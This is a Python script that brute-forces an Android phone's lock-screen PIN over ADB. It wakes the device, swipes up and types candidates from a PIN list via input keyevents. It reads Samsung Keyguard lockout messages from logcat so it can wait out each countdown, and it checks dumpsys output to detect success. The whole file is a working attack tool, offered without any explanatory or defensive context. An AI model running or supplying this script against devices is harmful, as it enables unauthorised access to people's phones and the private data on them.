import subprocess
import time
import re
import os
import sys

if len(sys.argv) != 2:
    print(f"Usage: python {sys.argv[0]} <password_list.txt>")
    sys.exit(1)

PIN_FILE = sys.argv[1]

def adb(cmd):
    result = subprocess.run(
        ["adb"] + cmd.split(),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    return result.stdout.strip()


def get_lockout_time():
    out = adb("logcat -d -t 300")

    m = re.search(r"KeyguardSecIndicationController: CountdownTimer - Try again in (.+)", out)
    if not m:
        return 0

    txt = m.group(1)

    sec = 0

    m1 = re.search(r"(\d+)\s*minute", txt)
    m2 = re.search(r"(\d+)\s*second", txt)

    if m1:
        sec += int(m1.group(1)) * 60
    if m2:
        sec += int(m2.group(1))

    return sec

def is_unlocked():
    out = adb("shell dumpsys window")
    if "mDreamingLockscreen=false" in out:
        return True
    return False

def is_wake_up():
    out = adb("shell dumpsys window")
    if out.count('isReadyForDisplay()=true') == 3:
        return True
    return False

def swipe_up():
    adb("shell input swipe 360 1200 360 300 300")

def enter_pin(pin):
    for d in pin:
        adb(f"shell input keyevent {7 + int(d)}")
        time.sleep(0.05)
    adb("shell input keyevent 66")

def brute_force():
    print("[*] Loading pin list...")

    if not os.path.exists(PIN_FILE):
        print("Cannot find file.txt")
        sys.exit(1)

    with open(PIN_FILE, "r") as f:
        pins = [line.strip() for line in f if line.strip()]

    print(f"[+] Loaded {len(pins)} PIN candidates")

    for pin in pins:
        print(f"\n[*] Trying PIN: {pin}")

        wait = get_lockout_time()
        if wait > 0:
            print(f"[!] Lockout active: waiting {wait} seconds...")
            time.sleep(wait + 2)


        while not is_wake_up():
            adb("shell input keyevent 26")
            time.sleep(0.5)

        swipe_up()
        time.sleep(0.4)

        enter_pin(pin)

        time.sleep(0.5)

        if is_unlocked():
            print(f"\n\n========================")
            print(f"  SUCCESS: PIN = {pin}")
            print(f"========================\n")
            return

    print("\n[-] No PIN matched in file.txt")

if __name__ == "__main__":
    brute_force()
